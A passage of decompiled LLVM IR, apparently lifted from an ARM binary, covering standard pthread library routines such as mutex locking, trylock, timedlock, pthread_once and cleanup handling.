dec_label_pc_f418:                                ; preds = %dec_label_pc_f390, %dec_label_pc_f410
  %v2_f41c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f41c, i32* @r4, align 4
  store i32 %v6_f364, i32* @r5, align 4
  ret i32 0

dec_label_pc_f420:                                ; preds = %dec_label_pc_f39c, %dec_label_pc_f3dc, %dec_label_pc_f3ec
  %v2_f424 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f424, i32* @r4, align 4
  store i32 %v6_f364, i32* @r5, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v6_f364, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v3_f360, { 1, 0 }
  uselistorder i32 %v0_f360, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f420, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f418, { 1, 0 }
  uselistorder label %dec_label_pc_f408, { 1, 0 }
}

define i32 @__pthread_once_fork_parent(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2be68.485 to i32), i32* @r0, align 4
  %v0_f42c = call i32 @pthread_mutex_unlock()
  %v0_f430 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f430, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v2_f430 = load i32, i32* @r8, align 4
  %v3_f430 = udiv i32 %v2_f430, 268435456
  %v4_f430 = mul i32 %v2_f430, 16
  %v5_f430 = or i32 %v3_f430, %v4_f430
  %v8_f430 = and i32 %v5_f430, %arg1
  store i32 %v8_f430, i32* @fp, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_f42c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_f434 = add i32 %arg2, 4
  %v2_f434 = inttoptr i32 %v1_f434 to i32*
  %v3_f434 = load i32, i32* %v2_f434, align 4
  store i32 999999999, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  %tmp = icmp ugt i32 %v3_f434, 999999999
  br i1 %tmp, label %dec_label_pc_f51c, label %dec_label_pc_f450

dec_label_pc_f450:                                ; preds = %entry
  %v1_f450 = add i32 %arg1, 12
  %v2_f450 = inttoptr i32 %v1_f450 to i32*
  %v3_f450 = load i32, i32* %v2_f450, align 4
  store i32 %v3_f450, i32* %r3.global-to-local, align 4
  switch i32 %v3_f450, label %dec_label_pc_f51c [
    i32 0, label %dec_label_pc_f470
    i32 1, label %dec_label_pc_f480
    i32 2, label %dec_label_pc_f4c0
    i32 3, label %dec_label_pc_f4fc
  ]

dec_label_pc_f470:                                ; preds = %dec_label_pc_f450
  %v1_f470 = add i32 %arg1, 16
  store i32 %v1_f470, i32* %r0.global-to-local, align 4
  %v2_f478 = call i32 @__pthread_lock(i32 %v1_f470, i32 0)
  store i32 %v2_f478, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f514

dec_label_pc_f480:                                ; preds = %dec_label_pc_f450
  %v0_f480 = call i32 @_thread_self.11()
  store i32 %v0_f480, i32* %r0.global-to-local, align 4
  %v0_f484 = load i32, i32* @r4, align 4
  %v1_f484 = add i32 %v0_f484, 8
  %v2_f484 = inttoptr i32 %v1_f484 to i32*
  %v3_f484 = load i32, i32* %v2_f484, align 4
  store i32 %v3_f484, i32* %r3.global-to-local, align 4
  %v9_f488 = icmp eq i32 %v3_f484, %v0_f480
  br i1 %v9_f488, label %.thread2, label %dec_label_pc_f4a0

.thread2:                                         ; preds = %dec_label_pc_f480
  %v2_f48c = add i32 %v0_f484, 4
  %v3_f48c = inttoptr i32 %v2_f48c to i32*
  %v4_f48c = load i32, i32* %v3_f48c, align 4
  %v2_f494 = add i32 %v4_f48c, 1
  store i32 %v2_f494, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f4b8

dec_label_pc_f4a0:                                ; preds = %dec_label_pc_f480
  %v1_f4a0 = add i32 %v0_f484, 16
  store i32 %v1_f4a0, i32* %r0.global-to-local, align 4
  %v2_f4a8 = call i32 @__pthread_lock(i32 %v1_f4a0, i32 %v0_f480)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f4b0 = load i32, i32* @r4, align 4
  %v2_f4b0 = add i32 %v1_f4b0, 8
  %v3_f4b0 = inttoptr i32 %v2_f4b0 to i32*
  store i32 %v0_f480, i32* %v3_f4b0, align 4
  %v0_f4b4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f4b4, i32* %r0.global-to-local, align 4
  %v1_f4b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f4b8

dec_label_pc_f4b8:                                ; preds = %.thread2, %dec_label_pc_f4a0
  %v1_f4b8 = phi i32 [ %v0_f484, %.thread2 ], [ %v1_f4b8.pre, %dec_label_pc_f4a0 ]
  %v0_f4b8 = phi i32 [ %v2_f494, %.thread2 ], [ %v0_f4b4, %dec_label_pc_f4a0 ]
  %v2_f4b8 = add i32 %v1_f4b8, 4
  %v3_f4b8 = inttoptr i32 %v2_f4b8 to i32*
  store i32 %v0_f4b8, i32* %v3_f4b8, align 4
  %v14_f4bc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v14_f4bc

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f450
  %v0_f4c0 = call i32 @_thread_self.11()
  store i32 %v0_f4c0, i32* %r0.global-to-local, align 4
  %v0_f4c4 = load i32, i32* @r4, align 4
  %v1_f4c4 = add i32 %v0_f4c4, 8
  %v2_f4c4 = inttoptr i32 %v1_f4c4 to i32*
  %v3_f4c4 = load i32, i32* %v2_f4c4, align 4
  store i32 %v3_f4c4, i32* %r3.global-to-local, align 4
  %v9_f4c8 = icmp eq i32 %v3_f4c4, %v0_f4c0
  store i32 %v0_f4c0, i32* @r5, align 4
  br i1 %v9_f4c8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_f4c0
  store i32 35, i32* %r0.global-to-local, align 4
  ret i32 35

.thread4:                                         ; preds = %dec_label_pc_f4c0
  %v0_f4d8 = load i32, i32* @r6, align 4
  %v1_f4dc = add i32 %v0_f4c4, 16
  store i32 %v1_f4dc, i32* %r0.global-to-local, align 4
  %v3_f4e4 = inttoptr i32 %v1_f4dc to i32*
  %v4_f4e4 = call i32 @__pthread_alt_timedlock(i32* %v3_f4e4, i32 %v0_f4c0, i32 %v0_f4d8)
  store i32 %v4_f4e4, i32* %r0.global-to-local, align 4
  %v2_f4e8 = icmp eq i32 %v4_f4e4, 0
  br i1 %v2_f4e8, label %dec_label_pc_f524, label %bb19

bb19:                                             ; preds = %.thread4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_f4f0 = load i32, i32* @r5, align 4
  %v2_f4f0 = load i32, i32* @r4, align 4
  %v3_f4f0 = add i32 %v2_f4f0, 8
  %v4_f4f0 = inttoptr i32 %v3_f4f0 to i32*
  store i32 %v1_f4f0, i32* %v4_f4f0, align 4
  %v15_f4f4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_f4f4

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f450
  %v1_f500 = add i32 %arg1, 16
  store i32 %v1_f500, i32* %r0.global-to-local, align 4
  %v3_f508 = inttoptr i32 %v1_f500 to i32*
  %v4_f508 = call i32 @__pthread_alt_timedlock(i32* %v3_f508, i32 0, i32 %arg2)
  store i32 %v4_f508, i32* %r0.global-to-local, align 4
  %v2_f50c = icmp eq i32 %v4_f508, 0
  br i1 %v2_f50c, label %dec_label_pc_f524, label %dec_label_pc_f514

dec_label_pc_f514:                                ; preds = %dec_label_pc_f4fc, %dec_label_pc_f470
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

dec_label_pc_f51c:                                ; preds = %dec_label_pc_f450, %entry
  store i32 22, i32* %r0.global-to-local, align 4
  ret i32 22

dec_label_pc_f524:                                ; preds = %.thread4, %dec_label_pc_f4fc
  store i32 110, i32* %r0.global-to-local, align 4
  ret i32 110

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 18, 14, 5, 1, 3, 4, 9, 6, 7, 10, 12, 8, 11, 13, 15, 17, 16, 0 }
  uselistorder i32 110, { 0, 3, 1, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f524, { 1, 0 }
  uselistorder label %dec_label_pc_f4b8, { 1, 0 }
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_f530 = add i32 %arg1, 12
  %v2_f530 = inttoptr i32 %v1_f530 to i32*
  %v3_f530 = load i32, i32* %v2_f530, align 4
  store i32 %v3_f530, i32* %r3.global-to-local, align 4
  %v3_f534 = load i32, i32* @r4, align 4
  store i32 %v3_f534, i32* %stack_var_-12, align 4
  %v6_f534 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v7_f53c = icmp eq i32 %v3_f530, 3
  store i1 %v7_f53c, i1* @cpsr_z, align 1
  switch i32 %v3_f530, label %dec_label_pc_f558 [
    i32 0, label %dec_label_pc_f560
    i32 1, label %dec_label_pc_f574
    i32 2, label %dec_label_pc_f5b4
    i32 3, label %dec_label_pc_f5e4
  ]

dec_label_pc_f558:                                ; preds = %entry
  store i32 22, i32* %r0.global-to-local, align 4
  store i32 %v3_f534, i32* @r4, align 4
  ret i32 22

dec_label_pc_f560:                                ; preds = %entry
  %v1_f560 = add i32 %arg1, 16
  store i32 %v1_f560, i32* %r0.global-to-local, align 4
  %v2_f568 = call i32 @__pthread_lock(i32 %v1_f560, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_f570 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f570, i32* @r4, align 4
  store i32 %v6_f534, i32* @r5, align 4
  ret i32 0

dec_label_pc_f574:                                ; preds = %entry
  %v0_f574 = call i32 @_thread_self.11()
  store i32 %v0_f574, i32* %r0.global-to-local, align 4
  %v0_f578 = load i32, i32* @r4, align 4
  %v1_f578 = add i32 %v0_f578, 8
  %v2_f578 = inttoptr i32 %v1_f578 to i32*
  %v3_f578 = load i32, i32* %v2_f578, align 4
  store i32 %v3_f578, i32* %r3.global-to-local, align 4
  %v9_f57c = icmp eq i32 %v3_f578, %v0_f574
  store i1 %v9_f57c, i1* @cpsr_z, align 1
  br i1 %v9_f57c, label %.thread2, label %dec_label_pc_f594

.thread2:                                         ; preds = %dec_label_pc_f574
  %v2_f580 = add i32 %v0_f578, 4
  %v3_f580 = inttoptr i32 %v2_f580 to i32*
  %v4_f580 = load i32, i32* %v3_f580, align 4
  %v2_f588 = add i32 %v4_f580, 1
  store i32 %v2_f588, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f5ac

dec_label_pc_f594:                                ; preds = %dec_label_pc_f574
  %v1_f594 = add i32 %v0_f578, 16
  store i32 %v1_f594, i32* %r0.global-to-local, align 4
  %v2_f59c = call i32 @__pthread_lock(i32 %v1_f594, i32 %v0_f574)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f5a4 = load i32, i32* @r4, align 4
  %v2_f5a4 = add i32 %v1_f5a4, 8
  %v3_f5a4 = inttoptr i32 %v2_f5a4 to i32*
  store i32 %v0_f574, i32* %v3_f5a4, align 4
  %v0_f5a8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f5a8, i32* %r0.global-to-local, align 4
  %v1_f5ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f5ac

dec_label_pc_f5ac:                                ; preds = %.thread2, %dec_label_pc_f594
  %v1_f5ac = phi i32 [ %v0_f578, %.thread2 ], [ %v1_f5ac.pre, %dec_label_pc_f594 ]
  %v0_f5ac = phi i32 [ %v2_f588, %.thread2 ], [ %v0_f5a8, %dec_label_pc_f594 ]
  %v2_f5ac = add i32 %v1_f5ac, 4
  %v3_f5ac = inttoptr i32 %v2_f5ac to i32*
  store i32 %v0_f5ac, i32* %v3_f5ac, align 4
  %v2_f5b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f5b0, i32* @r4, align 4
  store i32 %v6_f534, i32* @r5, align 4
  %v11_f5b0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_f5b0

dec_label_pc_f5b4:                                ; preds = %entry
  %v0_f5b4 = call i32 @_thread_self.11()
  store i32 %v0_f5b4, i32* %r0.global-to-local, align 4
  %v0_f5b8 = load i32, i32* @r4, align 4
  %v1_f5b8 = add i32 %v0_f5b8, 8
  %v2_f5b8 = inttoptr i32 %v1_f5b8 to i32*
  %v3_f5b8 = load i32, i32* %v2_f5b8, align 4
  store i32 %v3_f5b8, i32* %r3.global-to-local, align 4
  %v9_f5bc = icmp eq i32 %v3_f5b8, %v0_f5b4
  store i1 %v9_f5bc, i1* @cpsr_z, align 1
  store i32 %v0_f5b4, i32* @r5, align 4
  br i1 %v9_f5bc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_f5b4
  store i32 35, i32* %r0.global-to-local, align 4
  %v3_f5c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_f5c8, i32* @r4, align 4
  store i32 %v6_f534, i32* @r5, align 4
  ret i32 35

.thread4:                                         ; preds = %dec_label_pc_f5b4
  %v1_f5cc = add i32 %v0_f5b8, 16
  store i32 %v1_f5cc, i32* %r0.global-to-local, align 4
  %v2_f5d4 = inttoptr i32 %v1_f5cc to i32*
  %v3_f5d4 = call i32 @__pthread_alt_lock(i32* %v2_f5d4, i32 %v0_f5b4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_f5dc = load i32, i32* @r5, align 4
  %v1_f5dc = load i32, i32* @r4, align 4
  %v2_f5dc = add i32 %v1_f5dc, 8
  %v3_f5dc = inttoptr i32 %v2_f5dc to i32*
  store i32 %v0_f5dc, i32* %v3_f5dc, align 4
  %v2_f5e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f5e0, i32* @r4, align 4
  store i32 %v6_f534, i32* @r5, align 4
  ret i32 0

dec_label_pc_f5e4:                                ; preds = %entry
  %v1_f5e4 = add i32 %arg1, 16
  store i32 %v1_f5e4, i32* %r0.global-to-local, align 4
  %v2_f5ec = inttoptr i32 %v1_f5e4 to i32*
  %v3_f5ec = call i32 @__pthread_alt_lock(i32* %v2_f5ec, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_f5f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f5f4, i32* @r4, align 4
  store i32 %v6_f534, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v6_f534, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v3_f530, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 9, 6, 8, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_f5ac, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare(i32 %arg1) local_unnamed_addr {
entry:
  %v1_f5fc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2be68.485 to i32))
  %v0_f600 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f600, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v1_f5fc

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @pthread_once(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v6_f604 = load i32, i32* @r5, align 4
  %v9_f604 = load i32, i32* @r6, align 4
  %v12_f604 = load i32, i32* @r7, align 4
  %v2_f608 = load i32, i32* %arg1, align 4
  %v7_f60c = icmp eq i32 %v2_f608, 2
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_f60c, label %dec_label_pc_f714, label %dec_label_pc_f624

dec_label_pc_f624:                                ; preds = %entry
  store i32 63028, i32* @lr, align 4
  %v2_f630 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2be68.485 to i32))
  %v0_f634 = load i32, i32* @r5, align 4
  %v1_f634 = inttoptr i32 %v0_f634 to i32*
  %v2_f634 = load i32, i32* %v1_f634, align 4
  %v1_f638 = urem i32 %v2_f634, 4
  %v7_f63c = icmp eq i32 %v1_f638, 1
  br i1 %v7_f63c, label %dec_label_pc_f644, label %dec_label_pc_f664.preheader

dec_label_pc_f644:                                ; preds = %dec_label_pc_f624
  %v2_f648 = load i32, i32* @global_var_2be8c.489, align 4
  store i32 %v2_f648, i32* @r2, align 4
  %v1_f64c = and i32 %v2_f634, -4
  %v9_f650 = icmp eq i32 %v1_f64c, %v2_f648
  br i1 %v9_f650, label %dec_label_pc_f664.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_f644
  store i32 0, i32* %v1_f634, align 4
  %v0_f6642.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f664.preheader

dec_label_pc_f664.preheader:                      ; preds = %dec_label_pc_f624, %bb, %dec_label_pc_f644
  %v0_f6642 = phi i32 [ %v0_f634, %dec_label_pc_f624 ], [ %v0_f6642.pre, %bb ], [ %v0_f634, %dec_label_pc_f644 ]
  %v1_f6643 = inttoptr i32 %v0_f6642 to i32*
  %v2_f6644 = load i32, i32* %v1_f6643, align 4
  store i32 %v2_f6644, i32* @r6, align 4
  %v1_f6685 = urem i32 %v2_f6644, 4
  %v7_f66c8 = icmp eq i32 %v1_f6685, 1
  store i32 ptrtoint (i32* @global_var_2be68.485 to i32), i32* @r1, align 4
  br i1 %v7_f66c8, label %dec_label_pc_f660, label %dec_label_pc_f67c

dec_label_pc_f660:                                ; preds = %dec_label_pc_f664.preheader, %dec_label_pc_f660
  %v2_f660 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_2be80.487 to i32), i32 ptrtoint (i32* @global_var_2be68.485 to i32))
  %v0_f664 = load i32, i32* @r5, align 4
  %v1_f664 = inttoptr i32 %v0_f664 to i32*
  %v2_f664 = load i32, i32* %v1_f664, align 4
  store i32 %v2_f664, i32* @r6, align 4
  %v1_f668 = urem i32 %v2_f664, 4
  %v7_f66c = icmp eq i32 %v1_f668, 1
  store i32 ptrtoint (i32* @global_var_2be68.485 to i32), i32* @r1, align 4
  br i1 %v7_f66c, label %dec_label_pc_f660, label %dec_label_pc_f67c

dec_label_pc_f67c:                                ; preds = %dec_label_pc_f660, %dec_label_pc_f664.preheader
  %v1_f694 = phi i32 [ %v0_f6642, %dec_label_pc_f664.preheader ], [ %v0_f664, %dec_label_pc_f660 ]
  %v0_f67c = phi i32 [ %v2_f6644, %dec_label_pc_f664.preheader ], [ %v2_f664, %dec_label_pc_f660 ]
  %v2_f67c = icmp eq i32 %v0_f67c, 0
  br i1 %v2_f67c, label %dec_label_pc_f688, label %dec_label_pc_f6f8

dec_label_pc_f688:                                ; preds = %dec_label_pc_f67c
  %v2_f68c = load i32, i32* @global_var_2be8c.489, align 4
  %v1_f690 = or i32 %v2_f68c, 1
  %v2_f694 = inttoptr i32 %v1_f694 to i32*
  store i32 %v1_f690, i32* %v2_f694, align 4
  store i32 ptrtoint (i32* @global_var_2be68.485 to i32), i32* @r0, align 4
  %v1_f6a4 = call i32 @pthread_mutex_unlock()
  %v0_f6a8 = load i32, i32* @r5, align 4
  %v6_f6bc = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-36, i32 ptrtoint (i32* @global_var_f740.508 to i32), i32 %v0_f6a8, i32 58176)
  call void @__pseudo_branch(i32 %arg2)
  %v0_f6c8 = load i32, i32* @r6, align 4
  %v4_f6d8 = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-36, i32 %v0_f6c8)
  %v2_f6e8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2be68.485 to i32))
  %v1_f6f0 = load i32, i32* @r5, align 4
  %v2_f6f0 = inttoptr i32 %v1_f6f0 to i32*
  store i32 2, i32* %v2_f6f0, align 4
  br label %dec_label_pc_f6f8

dec_label_pc_f6f8:                                ; preds = %dec_label_pc_f67c, %dec_label_pc_f688
  %storemerge = phi i32 [ 1, %dec_label_pc_f688 ], [ 0, %dec_label_pc_f67c ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2be68.485 to i32), i32* @r0, align 4
  %v1_f704 = call i32 @pthread_mutex_unlock()
  %v0_f708 = load i32, i32* @r4, align 4
  %v2_f708 = icmp eq i32 %v0_f708, 0
  br i1 %v2_f708, label %bb22, label %bb21

bb21:                                             ; preds = %dec_label_pc_f6f8
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_f6f8, %bb21
  %v1_f710 = xor i1 %v2_f708, true
  call void @__pseudo_cond_branch(i1 %v1_f710, i32 ptrtoint (i32* @global_var_e6d4.511 to i32))
  br label %dec_label_pc_f714

dec_label_pc_f714:                                ; preds = %entry, %bb22
  store i32 %v6_f604, i32* @r5, align 4
  store i32 %v9_f604, i32* @r6, align 4
  store i32 %v12_f604, i32* @r7, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_f664, { 1, 0, 2 }
  uselistorder i32 %v2_f6644, { 1, 0, 2 }
  uselistorder i32 %v2_f634, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* @global_var_2be8c.489, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f714, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_f6f8, { 1, 0 }
  uselistorder label %dec_label_pc_f660, { 1, 0 }
  uselistorder label %dec_label_pc_f664.preheader, { 1, 2, 0 }
}

define i32 @pthread_once_cancelhandler(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_f740 = load i32, i32* @r4, align 4
  store i32 %v3_f740, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2be68.485 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_f758 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2be68.485 to i32))
  %v1_f760 = load i32, i32* @r5, align 4
  %v2_f760 = inttoptr i32 %v1_f760 to i32*
  store i32 0, i32* %v2_f760, align 4
  %v0_f764 = load i32, i32* @r4, align 4
  store i32 %v0_f764, i32* @r0, align 4
  %v1_f770 = call i32 @pthread_mutex_unlock()
  %v2_f778 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f778, i32* @r4, align 4
  %v1_f77c = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_2be80.487 to i32))
  ret i32 %v1_f77c

; uselistorder directives
  uselistorder i32* @global_var_2be80.487, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2be68.485 to i32), { 2, 7, 8, 3, 9, 10, 1, 0, 4, 5, 11, 6 }
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_f790 = add i32 %arg1, 12
  %v2_f790 = inttoptr i32 %v1_f790 to i32*
  %v3_f790 = load i32, i32* %v2_f790, align 4
  %v3_f794 = load i32, i32* @r4, align 4
  store i32 %v3_f794, i32* %stack_var_-12, align 4
  %v6_f794 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  switch i32 %v3_f790, label %dec_label_pc_f7b8 [
    i32 0, label %dec_label_pc_f7c0
    i32 1, label %dec_label_pc_f7dc
    i32 2, label %dec_label_pc_f824
    i32 3, label %dec_label_pc_f840
  ]

dec_label_pc_f7b8:                                ; preds = %entry
  store i32 22, i32* @r5, align 4
  br label %dec_label_pc_f84c

dec_label_pc_f7c0:                                ; preds = %entry
  store i32 16, i32* @r5, align 4
  br label %dec_label_pc_f84c

dec_label_pc_f7dc:                                ; preds = %entry
  %v0_f7dc = call i32 @_thread_self.11()
  %v0_f7e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7e0 = add i32 %v0_f7e0, 8
  %v2_f7e0 = inttoptr i32 %v1_f7e0 to i32*
  %v3_f7e0 = load i32, i32* %v2_f7e0, align 4
  %v9_f7e4 = icmp eq i32 %v3_f7e0, %v0_f7dc
  br i1 %v9_f7e4, label %.thread2, label %.thread3

.thread2:                                         ; preds = %dec_label_pc_f7dc
  %v2_f7ec = add i32 %v0_f7e0, 4
  %v3_f7ec = inttoptr i32 %v2_f7ec to i32*
  %v4_f7ec = load i32, i32* %v3_f7ec, align 4
  store i32 0, i32* @r5, align 4
  %v2_f7f4 = add i32 %v4_f7ec, 1
  store i32 %v2_f7f4, i32* %v3_f7ec, align 4
  br label %dec_label_pc_f84c

.thread3:                                         ; preds = %dec_label_pc_f7dc
  store i32 16, i32* @r5, align 4
  br label %dec_label_pc_f84c

dec_label_pc_f824:                                ; preds = %entry
  %v1_f824 = add i32 %arg1, 16
  %v1_f828 = inttoptr i32 %v1_f824 to i32*
  %v2_f828 = call i32 @__pthread_alt_trylock(i32* %v1_f828)
  store i32 %v2_f828, i32* @r5, align 4
  %v2_f82c = icmp eq i32 %v2_f828, 0
  br i1 %v2_f82c, label %dec_label_pc_f834, label %dec_label_pc_f84c

dec_label_pc_f834:                                ; preds = %dec_label_pc_f824
  %v0_f834 = call i32 @_thread_self.11()
  %v1_f838 = load i32, i32* %r4.global-to-local, align 4
  %v2_f838 = add i32 %v1_f838, 8
  %v3_f838 = inttoptr i32 %v2_f838 to i32*
  store i32 %v0_f834, i32* %v3_f838, align 4
  br label %dec_label_pc_f84c

dec_label_pc_f840:                                ; preds = %entry
  %v1_f840 = add i32 %arg1, 16
  store i32 %v3_f794, i32* %r4.global-to-local, align 4
  %v1_f848 = inttoptr i32 %v1_f840 to i32*
  %v2_f848 = call i32 @__pthread_alt_trylock(i32* %v1_f848)
  br label %dec_label_pc_f84c

dec_label_pc_f84c:                                ; preds = %.thread2, %.thread3, %dec_label_pc_f7c0, %dec_label_pc_f824, %dec_label_pc_f834, %dec_label_pc_f7b8, %dec_label_pc_f840
  %v0_f84c = load i32, i32* @r5, align 4
  %v2_f850 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f850, i32* @r4, align 4
  store i32 %v6_f794, i32* @r5, align 4
  ret i32 %v0_f84c

; uselistorder directives
  uselistorder i32 ()* @_thread_self.11, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_f84c, { 6, 4, 3, 1, 0, 2, 5 }
}

define i32 @pthread_cleanup_upto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_f854 = load i32, i32* @r4, align 4
  store i32 %v3_f854, i32* %stack_var_-20, align 4
  %v16_f854 = ptrtoint i32* %stack_var_-20 to i32
  %v2_f85c = load i32, i32* @global_var_2be4c.179, align 4
  %v3_f860 = icmp ult i32 %v16_f854, %v2_f85c
  store i32 %v16_f854, i32* %r6.global-to-local, align 4
  %v0_f868 = load i32, i32* @r0, align 4
  store i32 %v0_f868, i32* %r7.global-to-local, align 4
  br i1 %v3_f860, label %dec_label_pc_f874, label %bb

bb:                                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2b0c0 to i32), i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_f874:                                ; preds = %entry
  %v2_f878 = load i32, i32* @global_var_2be50.182, align 4
  %v3_f87c = icmp ult i32 %v16_f854, %v2_f878
  br i1 %v3_f87c, label %dec_label_pc_f898, label %dec_label_pc_f884

dec_label_pc_f884:                                ; preds = %dec_label_pc_f874
  %v2_f888 = load i32, i32* @global_var_2be54.184, align 4
  %v3_f88c = icmp ult i32 %v16_f854, %v2_f888
  br i1 %v3_f88c, label %bb17, label %dec_label_pc_f898

bb17:                                             ; preds = %dec_label_pc_f884
  store i32 ptrtoint (i32* @global_var_2b2a0.186 to i32), i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_f898:                                ; preds = %dec_label_pc_f884, %dec_label_pc_f874
  %v2_f89c = load i32, i32* @global_var_30238.188, align 4
  %v2_f8a0 = icmp eq i32 %v2_f89c, 0
  br i1 %v2_f8a0, label %dec_label_pc_f8bc, label %dec_label_pc_f8a8

dec_label_pc_f8a8:                                ; preds = %dec_label_pc_f898
  %v1_f8a8 = call i32 @__pthread_find_self(i32 %v0_f868)
  store i32 %v1_f8a8, i32* @r0, align 4
  store i32 %v1_f8a8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_f8b4:                                ; preds = %dec_label_pc_f8d4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f900

dec_label_pc_f8bc:                                ; preds = %dec_label_pc_f898
  %v3_f8bc = and i32 %v16_f854, -2097152
  %v4_f8bc = xor i32 %v3_f8bc, -2097152
  %v1_f8c8 = sub i32 -480, %v4_f8bc
  store i32 %v1_f8c8, i32* %r5.global-to-local, align 4
